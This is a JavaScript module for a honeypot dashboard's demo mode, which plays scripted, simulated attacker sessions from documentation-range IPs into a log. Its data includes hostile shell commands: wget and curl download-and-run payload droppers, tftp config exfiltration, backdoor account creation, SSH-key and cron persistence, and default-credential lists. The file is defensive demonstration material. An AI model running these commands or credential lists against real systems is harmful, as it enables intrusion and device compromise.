// Honeypot demo mode (?demo=1).
//
// Plays scripted, *simulated* attackers into the honeypot log so the page
// shows what Mock'it records when exposed to the internet. Nothing touches
// the network: every event is generated here and recorded through the same
// src/honeypot.py logger the real SSH/Telnet handlers use.
//
// All source addresses come from the documentation ranges reserved by
// RFC 5737 (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24), so no real host
// is ever shown as an attacker. Their countries are made up for the demo.
"use strict";

const MockitDemo = (() => {
  // Event helpers, formatted exactly like the container's honeypot log.
  const sshLogin = (u, p) => `SSH login: username=\`${u}\` password=\`${p}\``;
  const telnetLogin = (u, p) => `Telnet login: username=\`${u}\` password=\`${p}\``;
  const sshInput = (cmd) => `SSH input: ${pyRepr(cmd)}`;
  const telnetInput = (cmd) => `Telnet input: ${pyRepr(cmd)}`;
  const enablePw = (pw) => `SSH enable password: ${pyRepr(pw)}`;

  // Python's repr() for plain strings, matching the handlers' output.
  function pyRepr(s) {
    const q = s.includes("'") && !s.includes('"') ? '"' : "'";
    return q + s.replace(/\\/g, "\\\\").replace(new RegExp(q, "g"), `\\${q}`) + q;
  }

  // pace: "fast" for bots (sub-second), "human" for interactive sessions.
  const attackers = [
    {
      ip: "203.0.113.24", cc: "CN", country: "China", pace: "fast",
      name: "SSH brute force",
      events: [
        ["root", "123456"], ["root", "password"], ["root", "root"], ["admin", "admin"],
        ["root", "12345678"], ["ubnt", "ubnt"], ["root", "toor"], ["pi", "raspberry"],
        ["oracle", "oracle"], ["root", "P@ssw0rd"],
      ].map(([u, p]) => sshLogin(u, p)),
    },
    {
      ip: "198.51.100.83", cc: "BR", country: "Brazil", pace: "fast",
      name: "Mirai-style Telnet bot",
      events: [
        telnetLogin("admin", "admin"), telnetInput("enable"), telnetInput("system"),
        telnetInput("shell"), telnetInput("sh"), telnetInput("/bin/busybox MIRAI"),
        telnetInput("cd /tmp || cd /var/run; /bin/busybox wget http://198.51.100.7/bins/mips -O m; chmod 777 m; ./m telnet.mips"),
      ],
    },
    {
      ip: "192.0.2.147", cc: "RU", country: "Russia", pace: "human",
      name: "Router reconnaissance",
      events: [
        sshLogin("cisco", "cisco"), sshInput("show version"), sshInput("show ip interface brief"),
        sshInput("enable"), enablePw("cisco"), sshInput("show running-config"),
        sshInput("show ip route"), sshInput("show users"), sshInput("exit"),
      ],
    },
    {
      ip: "203.0.113.201", cc: "US", country: "United States", pace: "human",
      name: "Crypto-miner dropper",
      events: [
        sshLogin("root", "Welcome01!"), sshInput("uname -a"),
        sshInput("cat /proc/cpuinfo | grep name | wc -l"), sshInput("nproc; free -m"),
        sshInput("cd /tmp && curl -s http://203.0.113.66/xmr.sh -o .x.sh && chmod +x .x.sh && ./.x.sh"),
        sshInput("history -c; exit"),
      ],
    },
    {
      ip: "198.51.100.12", cc: "VN", country: "Vietnam", pace: "human",
      name: "Config exfiltration",
      events: [
        sshLogin("admin", "admin123"), sshInput("terminal length 0"),
        sshInput("show running-config | include username"), sshInput("show snmp community"),
        sshInput("copy running-config tftp://198.51.100.250/r1.cfg"), sshInput("exit"),
      ],
    },
    {
      ip: "192.0.2.58", cc: "IN", country: "India", pace: "human",
      name: "Backdoor account",
      events: [
        sshLogin("support", "support"), sshInput("enable"), enablePw("Cisco123"),
        sshInput("configure terminal"), sshInput("username netops privilege 15 secret 0 N3tOps!2024"),
        sshInput("ip ssh version 2"), sshInput("end"), sshInput("write memory"), sshInput("exit"),
      ],
    },
    {
      ip: "203.0.113.97", cc: "KR", country: "South Korea", pace: "fast",
      name: "Default credential sweep (Telnet)",
      events: [
        ["Administrator", "admin"], ["support", "support"], ["user", "user"],
        ["guest", "guest"], ["admin", "1234"], ["root", "vizxv"],
      ].map(([u, p]) => telnetLogin(u, p)),
    },
    {
      ip: "198.51.100.140", cc: "DE", country: "Germany", pace: "human",
      name: "Internet-wide scanner",
      events: [sshLogin("test", "test"), sshInput("echo 'scan-check'"), sshInput("exit")],
    },
    {
      ip: "192.0.2.211", cc: "ID", country: "Indonesia", pace: "human",
      name: "Huawei VRP probe",
      events: [
        sshLogin("admin", "Admin@123"), sshInput("display version"),
        sshInput("display current-configuration"), sshInput("system-view"),
        sshInput("display ip routing-table"), sshInput("quit"),
      ],
    },
    {
      ip: "203.0.113.155", cc: "NL", country: "Netherlands", pace: "fast",
      name: "Credential stuffing",
      events: [
        ["admin", "Welcome01!"], ["netadmin", "Summer2024!"], ["admin", "changeme"],
        ["cisco", "Cisco123!"], ["admin", "admin@123"],
      ].map(([u, p]) => sshLogin(u, p)),
    },
    {
      ip: "198.51.100.33", cc: "FR", country: "France", pace: "human",
      name: "Junos probe",
      events: [
        sshLogin("netconf", "netconf"), sshInput("show version"),
        sshInput("show configuration | display set"), sshInput("show system users"), sshInput("exit"),
      ],
    },
    {
      ip: "192.0.2.76", cc: "UA", country: "Ukraine", pace: "human",
      name: "SSH key persistence",
      events: [
        sshLogin("root", "admin"), sshInput("cat /etc/os-release"),
        sshInput("mkdir -p ~/.ssh && echo 'ssh-rsa AAAAB3Nza...demo' >> ~/.ssh/authorized_keys"),
        sshInput("(crontab -l; echo '*/5 * * * * /tmp/.u') | crontab -"), sshInput("exit"),
      ],
    },
  ];

  const MAX_ACTIVE = 3;
  let running = false;
  let ctx = null;
  let timers = new Set();
  let queue = [];
  let active = 0;

  const rand = (min, max) => min + Math.random() * (max - min);
  const delay = (pace) => (pace === "fast" ? rand(250, 750) : rand(1100, 3000));

  function later(fn, ms) {
    const id = setTimeout(() => { timers.delete(id); if (running) fn(); }, ms);
    timers.add(id);
  }

  function shuffled(list) {
    const a = list.slice();
    for (let i = a.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [a[i], a[j]] = [a[j], a[i]];
    }
    return a;
  }

  function nextAttacker() {
    if (!queue.length) queue = shuffled(attackers);
    return queue.shift();
  }

  function launch() {
    if (!running || active >= MAX_ACTIVE) return;
    const attacker = nextAttacker();
    active++;
    let i = 0;
    const step = () => {
      if (i < attacker.events.length) {
        ctx.record(attacker.ip, attacker.events[i++]);
        later(step, delay(attacker.pace));
      } else {
        active--;
        later(launch, rand(1500, 5000));
      }
    };
    step();
  }

  return {
    attackers,
    start(callbacks) {
      if (running) return;
      ctx = callbacks;
      for (const a of attackers) ctx.register(a.ip, a.cc, a.country);
      running = true;
      launch();
      later(launch, rand(1500, 3000));
      later(launch, rand(5000, 8000));
    },
    stop() {
      running = false;
      for (const id of timers) clearTimeout(id);
      timers = new Set();
      active = 0;
    },
    get running() { return running; },
  };
})();
